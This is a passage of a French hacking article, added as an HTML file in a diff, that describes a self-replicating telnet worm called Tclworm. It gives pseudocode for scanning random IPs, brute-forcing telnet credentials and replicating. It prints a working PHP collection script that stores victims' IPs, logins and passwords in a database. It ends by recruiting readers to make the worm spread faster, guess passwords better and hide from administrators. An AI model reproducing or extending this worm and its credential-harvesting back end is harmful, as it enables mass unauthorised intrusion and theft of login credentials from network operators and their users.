+    &nbsp;&nbsp;&nbsp;&nbsp;si cette ip commence par 127 on recommence avec une 
+    autre ip (&eacute;vite l'auto infection)<br>
+    &nbsp;&nbsp;&nbsp;&nbsp;si le port telnet n'est pas ouvert on recommence avec 
+    une autre ip<br>
+    &nbsp;&nbsp;&nbsp;&nbsp;sinon<br>
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;on teste un couple login/password<br>
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;si c'est pas bon on passe 
+    au couple suivant<br>
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sinon on apelle le script 
+    php<br>
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;si 
+    on a un haxored on se d&eacute;connecte<br>
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sinon 
+    on se r&eacute;plique et on se d&eacute;connecte<br>
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fin du sinon login/password<br>
+    &nbsp;&nbsp;&nbsp;&nbsp;fin du sinon telnet ouvert<br>
+    fin du tant que</font></p>
+  <p align="left"><font size="2">Pour ce qui est de la partie PHP qui r&eacute;cup&egrave;re 
+    la liste des serveurs contamin&eacute;s on peut faire le script suivant :</font></p>
+  <div align="left">
+    
+    <pre><font color="#FFFFFF" size="2">&lt;?
+if (isset(<font color="#FF0000">$ip</font>) &amp;&amp; <font color="#FF0000">$ip</font>!=<font color="#00FFFF">&quot;&quot;</font> &amp;&amp; isset(<font color="#FF0000">$login</font>) &amp;&amp; isset(<font color="#FF0000">$pass</font>)){
+  mysql_connect();
+  mysql_select_db(<font color="#00FFFF">'perso'</font>);
+  $result = mysql_query(<font color="#00FFFF">&quot;SELECT * FROM victim WHERE ip='</font><font color="#FF0000">$ip</font><font color="#00FFFF">'&quot;</font>);
+  <font color="#FF0000">$num_rows</font> = mysql_num_rows(<font color="#FF0000">$result</font>);
+  if (<font color="#FF0000">$num_rows</font>==0){
+    echo <font color="#00FFFF">&quot;gogetsome&quot;</font>;
+    mysql_query(<font color="#00FFFF">&quot;INSERT INTO victim VALUES ('</font><font color="#FF0000">$ip</font><font color="#00FFFF">','</font><font color="#FF0000">$login</font><font color="#00FFFF">','</font><font color="#FF0000">$pass</font><font color="#00FFFF">')&quot;</font>);
+  }
+  else {
+    echo <font color="#00FFFF">&quot;_haxored_&quot;</font>;
+  }
+  mysql_close();
+}
+else echo <font color="#00FFFF">&quot;gogetsome_eof&quot;</font>;
+
+?&gt;</font></pre>
+    <p><b>Evolution</b></p>
+    <p><font size="2">Le Tclworm est maintenant disponible sur packetstormsecurity.nl. 
+      Tout le monde peut le retoucher, le faire &eacute;voluer etc.<br>
+      Dans cet optique j'ai cr&eacute;&eacute; un 'projet' sur www.infoshackers.com. 
+      Le but de ce projet est d'am&eacute;liorer le ver principalement pour augmenter 
+      son efficacit&eacute;.<br>
+      Si vous avez lu cet article et les deux pr&eacute;c&eacute;dents vous avez 
+      du vous rendre compte que cela ne demandait pas de connaissances pouss&eacute;es 
+      en programmation. Tout le monde peut donc participer au projet, aporter 
+      de nouvelles id&eacute;es, proposer un nouveau module, une nouvelle fonction, 
+      voire une nouvelle version.</font></p>
+    <p><font size="2">Il y a un bon nombre d'am&eacute;liorations &agrave; effectuer. 
+      La plus simple est faire en sorte que le ver cherche Telnet plus de r&eacute;pertoires 
+      que l'actuelle version.<br>
+      Une fonction r&eacute;ellement int&eacute;ressante serait de d&eacute;duire 
+      des passwords possibles en fonction de la banni&egrave;re du serveur (si 
+      on a un 'Cisco server' on va se restreindre aux passwords cisco).<br>
+      On pourrait essayer de faire une version plus rapide qui utiliserait les 
+      Threads en Tcl.<br>
+      Il faudrait aussi que le ver soit un peu plus discret aux yeux de l'administrateur 
+      d'une machine infect&eacute;e.<br>
+      Il existe des fonctions de timeout dans Expect que je n'ai pas utilis&eacute; 
+      mais pourrais permettre d'&eacute;viter les situations bloquantes (le serveur 
+      envoie une chaine autre que login: ou user:).<br>
+      De plus j'ai d&eacute;j&agrave; vu des machines o&ugrave; Tcl est install&eacute; 
+      mais pas Expect. Ue version en Tcl pur serais une utopie ? A voir.</font></p>
+    <p><font size="2">L'objectif global est que le ver fonctionne sur le plus 
+      de machines Unix possible.<br>
+      A bient&ocirc;t donc ;-)</font></p>
+  </div>
+</div></body>
+</html>
